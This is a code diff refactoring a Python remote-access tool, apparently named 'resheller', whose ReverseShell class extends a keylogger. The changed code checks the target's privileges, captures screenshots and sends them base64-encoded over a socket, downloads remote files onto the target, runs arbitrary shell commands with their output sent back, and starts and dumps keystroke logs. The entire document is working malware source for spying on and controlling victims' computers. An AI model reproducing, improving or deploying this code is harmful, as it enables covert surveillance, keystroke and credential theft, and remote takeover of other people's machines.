@@ -14,6 +14,7 @@ from requests import get
 from resheller.src.client.ip import get_ip
 from resheller.src.client.keylogger import KeyLogger
 from resheller.src.pipe.safe_socket import SafeSocket
+from resheller.src.stdout.output import usage
 
 
 class ReverseShell(KeyLogger):
@@ -35,41 +36,40 @@ class ReverseShell(KeyLogger):
                 self.connect()
 
     def is_admin(self):
-        priv = '[!] Cannot Perform Check\n'
+        payload = '[!] Cannot Perform Check\n'
         try:
             if name == "nt":
                 try:
                     system_root = environ.get('SystemRoot', 'C:\\Windows')
                     _ = listdir(path.sep.join([system_root, 'temp']))
-                    priv = "[+] Running as Admin"
+                    payload = "[+] Running as Admin"
                 except PermissionError:
-                    priv = "[!] Running as User"
+                    payload = "[!] Running as User"
             else:
                 try:
                     # noinspection PyUnresolvedReferences
                     import os.geteuid
                     if os.geteuid() == 0:
-                        priv = "[+] Running as root"
+                        payload = "[+] Running as root"
                     else:
-                        priv = "[!] Running as user"
+                        payload = "[!] Running as user"
                 except ImportError:
                     pass
         except ValueError:
             pass
-        self.safe_sock.send(priv)
+        self.safe_sock.send(payload)
 
     def screenshot(self):
         try:
             with mss() as screenshot:
                 screenshot.shot()
-            with open("monitor-1.png", "rb") as capture:
-                capture = b64encode(capture.read())
-                image = capture.decode("utf-8")
-                self.safe_sock.send(image)
+            with open("monitor-1.png", "rb") as image:
+                image = b64encode(image.read())
+                payload = image.decode("utf-8")
             remove("monitor-1.png")
         except ValueError:
-            prompt = "\n[!] Failed to Take Screenshot\n"
-            self.safe_sock.send(prompt)
+            payload = "\n[!] Failed to Take Screenshot\n"
+        self.safe_sock.send(payload)
 
     def download(self, command):
         with open(command[9:], 'rb') as file:
@@ -84,24 +84,24 @@ class ReverseShell(KeyLogger):
             file_name = url.split('/')[-1]
             with open(file_name, 'wb') as out_file:
                 out_file.write(get_response.content)
-            prompt = f'[+] Downloaded "{file_name} to Target'
+            payload = f'[+] Downloaded "{file_name} to Target'
         except ValueError:
-            prompt = "[!] Failed to Downloaded File"
-        self.safe_sock.send(prompt)
+            payload = "[!] Failed to Downloaded File"
+        self.safe_sock.send(payload)
 
     def start(self, command):
         try:
             Popen(command[6:], shell=True)
-            prompt = f"[+] Started {command[6:]}"
+            payload = f"[+] Started {command[6:]}"
         except ValueError:
-            prompt = f"[!] Failed to Start {command[6:]}"
-        self.safe_sock.send(prompt)
+            payload = f"[!] Failed to Start {command[6:]}"
+        self.safe_sock.send(payload)
 
     def return_proc(self, command):
         proc = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
-        result = proc.stdout.read() + proc.stderr.read()
-        stdout = result.decode("utf-8")
-        self.safe_sock.send(stdout)
+        stdout = proc.stdout.read() + proc.stderr.read()
+        payload = stdout.decode("utf-8")
+        self.safe_sock.send(payload)
 
     def keylogger(self, command):
         if command[10:] == 'start':
@@ -116,11 +116,7 @@ class ReverseShell(KeyLogger):
                     log_file.close()
                 remove(self.log_path)
         else:
-            payload = (
-                "[!] Usage:\n\n"
-                "keylogger <opt>    --> <start> --> start keylogger on target\n"
-                "                       <dump>  --> retrieve logs from target\n"
-            )
+            payload = usage(session=False, keylogger=True)
         self.safe_sock.send(payload)
 
     def change_dir(self, command):
